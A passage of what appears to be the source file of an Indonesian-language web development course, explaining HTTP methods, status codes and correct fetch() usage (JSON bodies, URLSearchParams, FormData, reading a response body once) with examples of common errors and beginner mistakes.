          ['`PATCH`', 'Ubah sebagian isi sumber daya ini', 'Biasanya ya, tergantung isinya'],
          ['`DELETE`', 'Hapus sumber daya di alamat ini', 'Ya. Yang kedua menjawab tidak ada'],
        ],
        'Sifat boleh diulang inilah yang menentukan pilihan, bukan panjang atau pendeknya nama.',
      ),
      code(
        'js',
        `
        // SALAH: tiap penyimpanan otomatis membuat baris baru.
        await fetch('/api/draf', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ artikelId, isi }),
        });

        // BENAR: satu alamat per draf, dan PUT menggantinya.
        await fetch(\`/api/artikel/\${artikelId}/draf\`, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ isi }),
        });
        `,
        { caption: 'Alamatnya ikut berubah, bukan hanya methodnya.' },
      ),
      p(
        'Perhatikan yang berubah bukan hanya method melainkan juga bentuk alamatnya. Versi `POST` mengirim ke `/api/draf` yang berarti kumpulan draf, sehingga menambah anggota baru memang masuk akal. Versi `PUT` mengirim ke `/api/artikel/7/draf` yang berarti **draf milik artikel tujuh**, yaitu satu benda yang isinya diganti. Method dan alamat selalu dipilih bersama, sebab keduanya membentuk satu kalimat.',
      ),
      code(
        'js',
        `
        // Membaca status dengan benar, dikelompokkan bukan satu per satu.
        const respons = await fetch(alamat, opsi);

        if (respons.status === 204) return null;              // berhasil, tanpa isi
        if (respons.status === 401) return keLogin();         // belum masuk
        if (respons.status === 403) throw new Error('Tidak berhak');
        if (respons.status === 404) return null;              // memang tidak ada
        if (respons.status === 409) throw new Error('Sudah diubah orang lain');
        if (respons.status === 422) {
          const isi = await respons.json();
          throw new ErrorValidasi(isi.pesan, isi.field);      // diuji: field = 'email'
        }
        if (respons.status === 429) {
          const tunggu = Number(respons.headers.get('Retry-After')) || 5;   // diuji: 3
          throw new ErrorLaju(\`Coba lagi dalam \${tunggu} detik\`, tunggu);
        }
        if (respons.status >= 500) throw new ErrorServer(respons.status);
        if (!respons.ok) throw new Error(\`Status tak terduga \${respons.status}\`);
        `,
        { filename: 'src/api/status.js' },
      ),
      p(
        'Pengelompokan ini menutup perbedaan yang paling menentukan cara aplikasimu bereaksi. Perbedaan 401 dan 403 sering tertukar, padahal keduanya menuntut tindakan yang berlawanan. Kode 401 berarti sistem tidak tahu siapa kamu, jadi jalan keluarnya masuk lagi. Kode 403 berarti sistem tahu persis siapa kamu dan tetap menolak, jadi menyuruhnya masuk lagi hanya membuat pengguna berputar tanpa hasil.',
      ),
      p(
        'Kode 409 layak diperhatikan karena ia jawaban untuk masalah yang sangat nyata pada penyuntingan bersama. Kalau dua orang menyunting artikel yang sama dan yang kedua menyimpan lebih belakangan, tanpa 409 pekerjaan orang pertama tertimpa tanpa ada yang tahu. Server yang benar akan menolak dengan 409 kalau versi yang dikirim sudah kedaluwarsa, dan klien bisa menawarkan menggabungkan atau menimpa.',
      ),
      p(
        'Kode 429 diuji langsung terhadap server sungguhan, dan header `Retry-After` terbaca bernilai 3. Angka itu bukan saran melainkan permintaan penyedia, dan mengabaikannya berarti empat percobaanmu akan ditolak dengan alasan yang sama. Ini menyambung langsung ke materi pengulangan di Bab 3.',
      ),
      callout(
        'warning',
        '`GET` tidak boleh mengubah apa pun, dan itu bukan sekadar anjuran',
        'Peramban, proksi, dan pemindai tautan boleh memanggil `GET` kapan saja tanpa diminta, termasuk memanggilnya lebih awal untuk mempercepat. Endpoint `GET /hapus?id=7` bisa terpanggil oleh perayap mesin pencari dan menghapus seluruh datamu. Ini pernah terjadi pada aplikasi sungguhan, dan penyebabnya selalu sama.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Kesalahan HTTP terbagi dua, yaitu yang dijawab server dengan status dan yang gagal sebelum sampai. Empat berikut diuji terhadap server sungguhan.',
      ),
      code(
        'text',
        `
        const r = await fetch('/api/422');
        const isi = await r.json();
        console.log(r.status, isi.field);

        422 email
        `,
        { caption: 'Status 422 membawa keterangan kolom mana yang bermasalah.' },
      ),
      p(
        'Ini contoh respons kegagalan yang **berguna**, dan bentuknya layak dicontoh saat kamu merancang API sendiri. Statusnya menyatakan jenis masalahnya, dan badannya menyebut kolom yang bermasalah beserta pesan yang bisa ditampilkan. Dengan itu, klien bisa langsung menyorot kolom email tanpa menebak. Bandingkan dengan server yang menjawab 400 dengan badan kosong, yang memaksa klien menampilkan pesan umum yang tidak menolong siapa pun.',
      ),
      code(
        'text',
        `
        await fetch('/json');

        TypeError: Failed to parse URL from /json
          cause: ERR_INVALID_URL
        `,
        { caption: 'Alamat relatif dipakai di Node.js, bukan di peramban.' },
      ),
      p(
        'Alamat relatif seperti `/api/produk` hanya punya arti di peramban, sebab di sana ada halaman yang menjadi acuannya. Di Node.js tidak ada halaman, jadi tidak ada acuan untuk melengkapinya. Kesalahan ini muncul saat kode yang sama dipakai di kedua tempat, misalnya pada rendering di sisi server. Perbaikannya menyediakan alamat dasar lewat konfigurasi, lalu menggabungkannya di satu tempat.',
      ),
      code(
        'text',
        `
        const r = await fetch('/api/kosong');   // server menjawab 204
        await r.json();

        SyntaxError: Unexpected end of JSON input
        `,
        { caption: 'Respons 204 tidak punya badan sama sekali.' },
      ),
      p(
        'Status 204 berarti berhasil dan sengaja tidak ada isi, dan itu jawaban yang benar untuk `DELETE` atau `PUT` yang tidak perlu mengembalikan apa pun. Memanggil `json()` pada badan kosong melempar karena teks kosong memang bukan JSON yang sah. Periksa statusnya lebih dulu seperti pada contoh pengelompokan di atas, atau periksa header `Content-Length` sebelum mengurai.',
      ),
      code(
        'text',
        `
        await fetch('http://127.0.0.1:9/x');

        TypeError: fetch failed
          cause: bad port
        `,
        { caption: 'Sebagian port diblokir peramban dan runtime demi keamanan.' },
      ),
      p(
        'Port seperti 9, 25, dan beberapa puluh lainnya diblokir karena dipakai protokol lain dan pernah dipakai menyalahgunakan peramban sebagai perantara. Kalau server pengembanganmu kebetulan memakai salah satunya, permintaannya akan gagal dengan pesan yang tidak menyebut alasannya di peramban. Pindahkan ke port di atas 1024 yang tidak ada dalam daftar blokir.',
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            'Data bertambah tiap penyimpanan otomatis',
            '`POST` dipakai untuk hal yang seharusnya menggantikan',
            'Pakai `PUT` ke alamat yang menunjuk satu sumber daya',
          ],
          [
            '`Unexpected end of JSON input`',
            'Respons 204 atau badan kosong diurai sebagai JSON',
            'Periksa statusnya lebih dulu, dan kembalikan `null` untuk 204',
          ],
          [
            '`Failed to parse URL from /api/...`',
            'Alamat relatif dipakai di luar peramban',
            'Sediakan alamat dasar lewat konfigurasi',
          ],
          [
            'Pengguna berputar di halaman masuk terus',
            '403 diperlakukan seperti 401',
            'Bedakan keduanya, sebab 403 tidak selesai dengan masuk ulang',
          ],
          [
            'Empat percobaan ulang semuanya ditolak 429',
            'Header `Retry-After` diabaikan',
            'Baca headernya dan patuhi, seperti dibahas di Bab 3',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'HTTP punya banyak aturan yang terasa seperti formalitas sampai satu di antaranya menyebabkan kerusakan data. Baris di bawah adalah yang paling sering.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Memakai `POST` untuk semua yang bukan pengambilan data',
            'Ia bekerja untuk semuanya',
            'Kehilangan sifat boleh diulang, sehingga permintaan yang dikirim ulang jaringan menghasilkan data ganda. Pilih method sesuai maksudnya',
          ],
          [
            'Memakai `GET` dengan parameter untuk mengubah data',
            'Alamatnya lebih mudah dibuat',
            'Perayap dan pemuat awal peramban bisa memanggilnya tanpa diminta. Perubahan data tidak boleh lewat `GET`',
          ],
          [
            'Menaruh token atau kata sandi di parameter alamat',
            'Paling mudah dikirim',
            'Alamat tercatat di log server, di riwayat peramban, dan di header `Referer` saat pengguna mengklik tautan keluar. Kirim lewat header',
          ],
          [
            'Melupakan header `Content-Type` saat mengirim JSON',
            'Servernya kan sudah tahu bentuknya',
            'Sebagian kerangka kerja server tidak akan mengurai badannya dan menganggapnya kosong. Gejalanya berupa 400 dengan pesan kolom wajib padahal sudah diisi',
          ],
          [
            'Menganggap status 200 berarti operasinya berhasil',
            'Dua ratus kan berarti sukses',
            'Sebagian API menjawab 200 dengan badan berisi penanda gagal. Periksa juga isi responsnya, bukan hanya statusnya',
          ],
          [
            'Menghafal daftar status alih-alih mengelompokkannya',
            'Angkanya banyak',
            'Cukup ingat kelompoknya, yaitu 2xx berhasil, 3xx dialihkan, 4xx kesalahan pengirim, 5xx kesalahan server. Sisanya dicari saat dibutuhkan',
          ],
        ],
      ),
      p(
        'Baris ketiga punya akibat yang sering diremehkan. Alamat lengkap beserta parameternya tercatat di banyak tempat yang tidak kamu kendalikan, termasuk log server pihak ketiga dan riwayat peramban yang bisa disinkronkan ke perangkat lain. Token yang bocor lewat jalur itu tetap berlaku sampai kedaluwarsa. Header `Authorization` ada justru untuk keperluan ini, dan pembahasannya ada di Sub-bab 5.7.',
      ),
      callout(
        'tip',
        'Satu kalimat untuk memilih method',
        'Kalau permintaan yang sama dikirim dua kali karena jaringan buruk, apakah hasil akhirnya boleh berbeda. Kalau jawabannya tidak boleh, kamu butuh method yang boleh diulang, yaitu `PUT` atau `DELETE`, atau `POST` dengan kunci idempoten. Kalau boleh berbeda, misalnya menambah komentar baru, `POST` memang tepat.',
      ),
      divider,
      h2('Rangkuman'),
      ul(
        '`GET` harus aman — jangan pernah mengubah data lewatnya.',
        'Idempoten berarti mengulang tidak mengubah hasil akhir; `POST` tidak idempoten.',
        '`401` belum login, `403` tidak berhak, `400` bentuk salah, `422` isi tidak valid.',
        'Nama header tidak case-sensitive; sebagian tersembunyi pada permintaan lintas origin.',
        'Pakai `URL` dan `searchParams`, jangan merangkai query string dengan tangan.',
      ),
      references(
        {
          label: 'HTTP request methods',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods',
          source: 'MDN',
          note: 'Tabel resmi sifat aman dan idempoten tiap method — dasar seluruh sub-bab ini.',
        },
        {
          label: 'HTTP response status codes',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status',
          source: 'MDN',
          note: 'Daftar lengkap status beserta arti tiap kelompok digit pertamanya.',
        },
        {
          label: 'HTTP headers',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers',
          source: 'MDN',
          note: 'Rujukan seluruh header, termasuk mana yang boleh dibaca pada permintaan lintas origin.',
        },
        {
          label: 'URL',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/URL',
          source: 'MDN',
          note: 'Beserta `searchParams` — cara aman menyusun query string tanpa merangkai teks.',
        },
        {
          label: 'RFC 9110: HTTP Semantics',
          href: 'https://www.rfc-editor.org/rfc/rfc9110.html',
          source: 'IETF',
          note: 'Spesifikasi aslinya, source of truth untuk definisi "safe" dan "idempotent".',
        },
      ),
    ],
  ),

  written(
    'fetch-dasar',
    '`fetch()`: GET, POST, JSON, header',
    20,
    'Pemanggilan API sehari-hari, dari yang paling sederhana sampai unggahan berkas.',
    [
      terms(
        {
          term: 'res',
          meaning:
            'Singkatan *response*, nama variabel yang lazim untuk hasil `fetch`. Yang wajib dipahami: **`res` belum berisi datanya** — ia baru berisi status, header, dan sebuah aliran yang belum dibaca. Datanya keluar setelah `await res.json()`, dan itulah sebabnya hampir selalu ada dua `await` berturut-turut.',
        },
        {
          term: 'res.json()',
          meaning:
            'Method yang **membaca badan jawaban lalu mengurainya sebagai JSON**. Ia mengembalikan Promise karena badan pesan bisa saja masih mengalir dari jaringan. Perlu diketahui bahwa memanggilnya pada jawaban yang bukan JSON, misalnya halaman error HTML, akan melempar `SyntaxError` yang pesannya membingungkan.',
        },
        {
          term: 'res.text()',
          meaning:
            'Membaca badan jawaban sebagai teks mentah. Berguna saat kamu tidak yakin server mengirim JSON, atau ketika ingin melihat isi sebenarnya dari jawaban yang gagal diurai.',
        },
        {
          term: 'body sekali baca',
          meaning:
            'Badan jawaban `fetch` hanya bisa **dibaca satu kali**. Memanggil `res.json()` setelah `res.text()` pada objek yang sama melempar error. Kalau butuh keduanya, baca sebagai teks lalu urai sendiri dengan `JSON.parse`, atau gandakan dulu dengan `res.clone()`.',
        },
        {
          term: 'options',
          meaning:
            'Objek argumen kedua `fetch` yang mengatur permintaan: `method`, `headers`, `body`, `signal`, `credentials`. Tanpa objek ini, `fetch` menganggap permintaanmu `GET` sederhana.',
        },
        {
          term: 'JSON.stringify',
          meaning:
            'Mengubah object JavaScript menjadi teks JSON, kebalikan dari `JSON.parse`. Wajib dipakai saat mengisi `body`, karena `fetch` **tidak** mengubah object menjadi JSON dengan sendirinya — mengirim object mentah menghasilkan teks `[object Object]` yang tidak berguna.',
        },
        {
          term: 'query string',
          meaning:
            'Bagian URL setelah tanda tanya, berisi pasangan nama–nilai: `?status=aktif&hal=2`. Susun dengan `URLSearchParams` dan jangan pernah merangkainya dengan penyambungan teks — nilai yang mengandung spasi, tanda `&`, atau huruf non-Latin akan merusak alamatnya.',
        },
        {
          term: 'encodeURIComponent',
          meaning:
            'Fungsi yang mengubah karakter bermakna khusus menjadi bentuk amannya untuk URL — spasi menjadi `%20`, `&` menjadi `%26`. `URLSearchParams` sudah melakukannya otomatis, jadi kamu jarang perlu memanggilnya sendiri.',
        },
        {
          term: 'multipart/form-data',
          meaning:
            'Format badan pesan untuk mengirim **berkas** bersama data teks. Aturan yang sering menjebak: kalau kamu memakai `FormData`, **jangan menulis header `Content-Type` sendiri** — browser harus menyusunnya sendiri agar bisa menyisipkan penanda pembatas yang benar.',
        },
      ),

      h2('GET'),
      code(
        'js',
        `
        const res = await fetch('/api/tugas');
        const data = await res.json();

        // Dengan query — pakai URL, bukan sambung string
        const url = new URL('/api/tugas', location.origin);
        url.searchParams.set('status', 'aktif');
        url.searchParams.set('cari', 'a b&c');       // otomatis di-encode
        await fetch(url);
        // /api/tugas?status=aktif&cari=a+b%26c
        `,
        { caption: 'Dua baris untuk kasus paling sederhana; sisanya untuk query yang aman.' },
      ),
      p(
        '`GET` adalah method bawaan `fetch`, jadi dua baris pertama tidak perlu menyebutkan apa pun selain alamatnya. Bagian bawah menangani query, dan `new URL(path, location.origin)` dipakai karena konstruktor `URL` membutuhkan alamat lengkap, sehingga argumen kedua menyediakan bagian `https://domain` agar kamu tetap bisa menulis path relatif. `searchParams.set()` menambahkan parameter **beserta encoding-nya**, dan hasil di baris komentar membuktikannya, karena spasi menjadi `+` dan `&` di dalam nilai pencarian menjadi `%26`. Encoding itulah yang menyelamatkanmu, sebab tanpa itu tanda `&` dari ketikan pengguna akan dibaca server sebagai pemisah parameter, sehingga pencarian terpotong dan muncul parameter ketiga yang tidak pernah kamu kirim. Perhatikan juga objek `url` bisa langsung dioper ke `fetch` tanpa diubah jadi string.',
      ),
      callout(
        'danger',
        'Jangan pernah merangkai query dengan string',
        '`?cari=${kata}` akan rusak begitu kata mengandung `&`, `=`, `#`, atau spasi — dan pada kasus tertentu bisa menyisipkan parameter tambahan yang tidak kamu maksud. `searchParams.set()` meng-encode semuanya dengan benar.',
      ),

      h2('POST dengan JSON'),
      code(
        'js',
        `
        const res = await fetch('/api/tugas', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ judul: 'Belajar fetch' }),
        });
        `,
      ),
      p(
        'Tiga baris opsi itu bersesuaian langsung dengan bentuk mentah HTTP di sub-bab sebelumnya. `method` menjadi kata pertama baris permintaan, `headers` menjadi baris-baris `Nama: nilai`, dan `body` menjadi isi setelah baris kosong. Dua di antaranya sering dilupakan dan keduanya menghasilkan gejala yang sama. `JSON.stringify` diperlukan karena **body harus berupa teks**, sebab mengoper object mentah membuatnya diubah menjadi string `"[object Object]"` yang tentu saja bukan JSON yang sah. Header `Content-Type` diperlukan karena server tidak menebak format body, dan tanpa pengumuman itu ia tidak akan menjalankan pengurai JSON dan menganggap tidak ada data yang dikirim. Yang membuat keduanya mahal adalah **tidak ada error apa pun di sisi klien**. Kamu hanya menerima `400` tanpa penjelasan, dan penyebabnya ada di baris yang justru tidak kamu tulis.',
      ),
      callout(
        'warning',
        'Dua kesalahan yang membuat server membalas 400',
        'Lupa `JSON.stringify` (body-nya jadi `"[object Object]"`) dan lupa header `Content-Type` (server tidak tahu cara mem-parse-nya). Keduanya tidak menghasilkan error di sisi klien — kamu hanya melihat 400 tanpa penjelasan.',
      ),

      h2('Membaca respons'),
      code(
        'js',
        `
        await res.json();       // objek — melempar SyntaxError kalau body bukan JSON
        await res.text();       // string mentah
        await res.blob();       // untuk berkas dan gambar
        await res.formData();
        await res.arrayBuffer();

        // Body hanya bisa dibaca SATU KALI
        const a = await res.json();
        const b = await res.json();   // TypeError: body stream already read

        // Kalau butuh dua kali, salin dulu
        const salinan = res.clone();
        `,
      ),
      p(
        'Kelima method di atas membaca **body yang sama** dengan penafsiran berbeda, dan pilihannya ditentukan oleh apa yang dikirim server. Pakai `json()` untuk data, `text()` untuk teks mentah atau saat kamu ingin melihat apa adanya, dan `blob()` untuk berkas dan gambar yang akan diunduh atau ditampilkan. Bagian yang paling sering menggigit ada di tengah, yaitu **body hanya bisa dibaca satu kali.** Itu bukan pembatasan yang dibuat-buat, sebab body datang sebagai aliran data dari jaringan, dan aliran yang sudah habis dibaca tidak bisa diputar ulang. Pemanggilan kedua melempar `TypeError`, dan bugnya biasanya muncul di kode yang mencoba membaca respons dulu untuk mencatat log lalu membacanya lagi untuk dipakai. `res.clone()` adalah jalan keluarnya, dan ia harus dipanggil **sebelum** pembacaan pertama.',
      ),
      callout(
        'tip',
        'Periksa `content-type` sebelum `res.json()`',
        'Kalau server error dan membalas halaman HTML, `res.json()` melempar `SyntaxError: Unexpected token <` — pesan yang menyesatkan karena masalah sebenarnya ada di server, bukan di parsing.',
      ),
      code(
        'js',
        `
        const tipe = res.headers.get('content-type') ?? '';
        const data = tipe.includes('application/json') ? await res.json() : await res.text();
        `,
      ),
      p(
        "Dua baris ini mengubah kegagalan yang membingungkan menjadi kegagalan yang bisa dibaca. Ketika server bermasalah, ia sering membalas **halaman HTML** berupa halaman error bawaan proxy atau gateway, alih-alih JSON. Memaksa `res.json()` pada halaman itu menghasilkan `SyntaxError: Unexpected token <`, dan tanda `<` yang disebut errornya adalah awal `<!doctype html>`. Pesan itu menyesatkan karena mengarahkanmu mencurigai kode parsing, padahal masalahnya ada di server. Dengan memeriksa `content-type` lebih dulu, respons non-JSON dibaca sebagai teks apa adanya, sehingga isinya bisa kamu catat ke log dan penyebab sebenarnya langsung terlihat. Perhatikan `?? ''` di baris pertama, karena header itu bisa saja tidak ada sama sekali, dan memanggil `.includes` pada `null` akan melempar error tersendiri.",
      ),

      h2('Opsi lain yang sering dipakai'),
      code(
        'js',
        `
        await fetch(url, {
          method: 'POST',
          headers: { Accept: 'application/json' },
          body: data,
          credentials: 'include',   // kirim cookie lintas origin
          cache: 'no-store',        // jangan pakai cache
          redirect: 'follow',       // 'error' kalau ingin menolak pengalihan
          signal: AbortSignal.timeout(10_000),
        });
        `,
      ),
      p(
        "Empat opsi terakhir mengatur hal-hal yang mudah terlupakan sampai ada yang rusak. `credentials: 'include'` diperlukan agar cookie ikut terkirim ke **origin yang berbeda**, sebab bawaannya `same-origin` sehingga API di subdomain lain tidak akan menerima sesi pengguna kecuali opsi ini disebut dan servernya mengizinkan lewat CORS. `cache: 'no-store'` memaksa permintaan benar-benar sampai ke server, berguna untuk data yang harus selalu terbaru. `redirect: 'follow'` adalah bawaan, sedangkan nilai `'error'` berguna ketika pengalihan justru menandakan sesuatu yang salah, misalnya API yang diam-diam melempar ke halaman login. Dan `signal: AbortSignal.timeout(10_000)` menutup celah yang paling sering diabaikan, karena `fetch` tidak punya batas waktu bawaan, jadi tanpa baris ini permintaan ke server yang menggantung akan menunggu selamanya.",
      ),
      table(
        ['`credentials`', 'Artinya'],
        [
          ['`same-origin`', 'Bawaan — cookie hanya untuk origin yang sama'],
          ['`include`', 'Kirim cookie juga lintas origin (server harus mengizinkannya)'],
          ['`omit`', 'Jangan pernah kirim cookie'],
        ],
      ),

      h2('Membungkus jadi satu tempat'),
      code(
        'js',
        `
        async function api(path, opsi = {}) {
          const res = await fetch(\`/api\${path}\`, {
            headers: { Accept: 'application/json', ...opsi.headers },
            signal: AbortSignal.timeout(10_000),
            ...opsi,
          });

          if (!res.ok) {
            const error = new Error(\`Permintaan gagal: \${res.status}\`);
            error.status = res.status;
            throw error;
          }

          return res.status === 204 ? null : res.json();
        }

        await api('/tugas');
        await api('/tugas', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ judul: 'x' }),
        });
        `,
        { caption: 'Versi lengkapnya dibangun di sub-bab 5.11.' },
      ),
      p(
        'Perhatikan tiga keputusan kecil di `api()`. Header default `Accept: application/json` bisa ditimpa pemanggil lewat `...opsi.headers` karena spread yang datang belakangan menang, pola yang sama seperti spread object di Bab 1. Lalu `error.status = res.status` menempelkan kode status ke objek error supaya pemanggil bisa membedakan "401 perlu login" dari "500 server bermasalah" tanpa mem-parsing pesannya. Dan `res.status === 204 ? null : res.json()` mencegah `res.json()` dipanggil pada respons yang memang tidak punya body sama sekali, sesuai peringatan di rangkuman.',
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Halaman daftar pesanan admin punya filter status, pencarian teks, pengurutan, dan paginasi. Keempatnya harus tercermin di alamat halaman supaya bisa dibagikan dan supaya tombol kembali bekerja. Kamu menyusun alamatnya dengan menggabungkan teks, dan dua bug muncul. Pencarian yang berisi tanda tambah tidak pernah menemukan apa pun, dan filter yang kosong tetap terkirim sebagai parameter kosong yang membingungkan server.',
      ),
      p(
        'Keduanya selesai dengan `URLSearchParams`, yaitu API bawaan yang menyandikan nilai dengan benar dan tidak menambahkan parameter yang tidak diisi.',
      ),
      code(
        'js',
        `
        function bangunAlamat({ status, cari, urut, halaman }) {
          const params = new URLSearchParams();

          // Hanya tambahkan yang benar-benar terisi.
          if (status) params.set('status', status);
          if (cari?.trim()) params.set('q', cari.trim());
          if (urut) params.set('urut', urut);
          if (halaman > 1) params.set('halaman', String(halaman));

          const kueri = params.toString();
          return kueri ? \`/api/pesanan?\${kueri}\` : '/api/pesanan';
        }

        bangunAlamat({ cari: 'kaos + topi', halaman: 2 });
        // '/api/pesanan?q=kaos+%2B+topi&halaman=2'
        `,
        { filename: 'src/admin/alamat.js' },
      ),
      p(
        'Perhatikan hasil penyandiannya. Spasi menjadi tanda tambah, dan tanda tambah yang **memang diketik pengguna** menjadi `%2B`. Kalau alamatnya disusun dengan penggabungan teks biasa, tanda tambah dari pengguna akan sampai ke server sebagai spasi, dan pencarian tidak pernah cocok. Ini kelas bug yang seluruhnya hilang begitu penyandiannya diserahkan ke API bawaan.',
      ),
      p(
        'Pola `if (status)` sebelum `set` menghasilkan alamat yang bersih, dan itu berpengaruh lebih jauh daripada estetika. Alamat yang berbeda dianggap sumber daya yang berbeda oleh cache peramban dan oleh CDN, sehingga `?status=&q=` dan alamat tanpa parameter sama sekali akan disimpan sebagai dua entri terpisah walaupun hasilnya sama. Menjaga alamat tetap kanonik meningkatkan tingkat keberhasilan cache.',
      ),
      code(
        'js',
        `
        // Empat cara mengirim badan permintaan, dengan Content-Type yang berbeda.

        // 1. JSON — yang paling sering.
        await fetch(alamat, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ nama, email }),
        });

        // 2. FormData — untuk berkas. JANGAN setel Content-Type sendiri.
        const fd = new FormData();
        fd.append('berkas', input.files[0]);
        fd.append('judul', judul);
        await fetch(alamat, { method: 'POST', body: fd });

        // 3. URLSearchParams — badan bergaya formulir lama.
        await fetch(alamat, {
          method: 'POST',
          body: new URLSearchParams({ nama, email }),
        });

        // 4. Teks biasa.
        await fetch(alamat, {
          method: 'POST',
          headers: { 'Content-Type': 'text/plain' },
          body: 'catatan bebas',
        });
        `,
        { caption: 'Untuk dua bentuk di tengah, peramban menyetel `Content-Type` sendiri.' },
      ),
      p(
        'Baris jangan setel `Content-Type` sendiri pada `FormData` adalah salah satu jebakan yang paling sering. Kiriman berkas memakai bentuk yang butuh pembatas acak antar-bagian, dan pembatas itu harus disebut di dalam `Content-Type`. Peramban membuatnya sendiri dan menyertakannya. Kalau kamu menuliskan `Content-Type: multipart/form-data` secara manual, pembatasnya hilang dan server tidak bisa memisahkan bagian-bagiannya. Gejalanya berupa 400 dengan pesan yang tidak menjelaskan apa pun.',
      ),
      code(
        'js',
        `
        // Membaca respons sesuai bentuknya, dan hanya sekali.
        const respons = await fetch(alamat);

        await respons.json();        // JSON  -> object
        await respons.text();        // teks  -> string
        await respons.blob();        // biner -> Blob, untuk unduhan
        await respons.arrayBuffer(); // biner -> ArrayBuffer
        await respons.formData();    // jarang, untuk balasan bergaya formulir

        // Badan hanya bisa dibaca SEKALI. Untuk dua kali, salin dulu:
        const salinan = respons.clone();
        const teks = await salinan.text();
        const data = await respons.json();
        `,
        { caption: 'Bentuk yang dipilih harus cocok dengan yang benar-benar dikirim server.' },
      ),
      p(
        'Method `clone` layak diingat karena ia menyelesaikan masalah yang sering muncul di kode penanganan galat. Pola yang biasa ditulis orang adalah mencoba `json()` lalu kalau gagal membaca `text()` untuk dicatat, dan pola itu selalu gagal karena badannya sudah habis. Dengan `clone` sebelum pembacaan pertama, kamu punya dua salinan yang masing-masing bisa dibaca sekali.',
      ),
      callout(
        'tip',
        'Bangun alamat dari satu tempat, jangan disebar',
        'Kalau alamat API disusun di sepuluh berkas berbeda, mengubah awalan atau menambah parameter versi berarti menyunting sepuluh tempat. Kumpulkan pembangunan alamat ke satu modul seperti contoh di atas, lalu seluruh pemanggilan memakainya. Ini juga yang membuat penambahan parameter bersama, misalnya penanda bahasa, cukup satu baris.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Empat kegagalan berikut adalah yang paling sering saat pertama kali memakai `fetch` untuk sesuatu yang lebih dari sekadar mengambil JSON. Semuanya diuji terhadap server sungguhan.',
      ),
      code(
        'text',
        `
        const r = await fetch('/api/html');
        await r.json();

        SyntaxError: Unexpected token '<', "<!doctype "... is not valid JSON
        `,
        { caption: 'Bentuk yang dibaca tidak cocok dengan yang dikirim server.' },
      ),
      p(
        'Kalau kamu melihat pesan ini, jangan mulai dari kode penguraiannya. Buka tab Network, klik permintaannya, lalu lihat tab Response. Isinya akan langsung memberi tahu apa yang sebenarnya dikirim server, dan hampir selalu berupa halaman 404, halaman masuk, atau halaman galat dari proksi. Masalahnya ada di alamat atau di sesi, bukan di penguraiannya.',
      ),
      code(
        'text',
        `
        const r = await fetch('/api/json');
        await r.json();
        await r.json();

        TypeError: Body is unusable: Body has already been read
        `,
        { caption: 'Badan respons hanya bisa mengalir sekali.' },
      ),
      p(
        'Selain pola penanganan galat yang sudah disebut, penyebab lain yang sering adalah sebuah respons diteruskan ke dua fungsi yang keduanya membacanya. Ini terjadi pada pembungkus `fetch` yang mencatat isi respons untuk keperluan debug lalu meneruskan responsnya ke pemanggil. Pencatatnya harus memakai `clone`, bukan membaca aslinya.',
      ),
      code(
        'text',
        `
        const fd = new FormData();
        fd.append('berkas', berkas);
        await fetch(alamat, {
          method: 'POST',
          headers: { 'Content-Type': 'multipart/form-data' },   // JANGAN
          body: fd,
        });

        // Server menjawab 400: tidak ada bagian yang bisa dibaca.
        `,
        { caption: '`Content-Type` yang ditulis manual menghilangkan pembatas antar-bagian.' },
      ),
      p(
        'Gejalanya membingungkan karena permintaannya jelas terkirim dan berkasnya jelas ada di badan. Yang hilang hanya pembatas acak yang seharusnya disebut di dalam `Content-Type`, dan tanpa itu server tidak punya cara memisahkan bagian berkas dari bagian teks. Hapus barisnya, dan biarkan peramban yang menyetelnya.',
      ),
      code(
        'text',
        `
        const alamat = \`/api/cari?q=\${kata}\`;   // kata = 'kaos & topi'
        await fetch(alamat);

        // Server hanya menerima q=kaos
        // Bagian setelah & dianggap parameter lain.
        `,
        { caption: 'Tidak ada error, dan sebagian nilainya hilang.' },
      ),
      p(
        'Tanda `&` memisahkan parameter, jadi nilai yang mengandungnya akan terpotong. Hal yang sama berlaku untuk `#`, `+`, dan `=`. Tidak ada error karena alamatnya tetap sah, hanya artinya berbeda dari yang kamu maksud. `URLSearchParams` menyandikan semuanya dengan benar, dan itu alasan utama memakainya alih-alih menggabung teks.',
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            "`Unexpected token '<' ... is not valid JSON`",
            'Server mengirim HTML, bukan JSON',
            'Periksa isi respons di tab Network sebelum menduga penguraiannya',
          ],
          [
            '`Body is unusable`',
            'Badan respons dibaca dua kali',
            'Pakai `respons.clone()` sebelum pembacaan pertama',
          ],
          [
            'Unggahan berkas ditolak 400 tanpa penjelasan',
            '`Content-Type` untuk `FormData` ditulis manual',
            'Hapus barisnya, biarkan peramban menyetelnya',
          ],
          [
            'Sebagian nilai pencarian hilang',
            'Karakter khusus tidak disandikan',
            'Bangun alamat dengan `URLSearchParams`',
          ],
          [
            'Server menerima badan kosong pada kiriman JSON',
            'Header `Content-Type: application/json` tidak disetel',
            'Setel headernya, sebab banyak server tidak mengurai tanpanya',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        '`fetch` dirancang sangat longgar, dan kelonggaran itu berarti banyak hal yang harus kamu putuskan sendiri. Baris di bawah adalah keputusan yang paling sering diambil keliru.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Menyusun alamat dengan menggabung teks',
            'Paling langsung dan terlihat jelas',
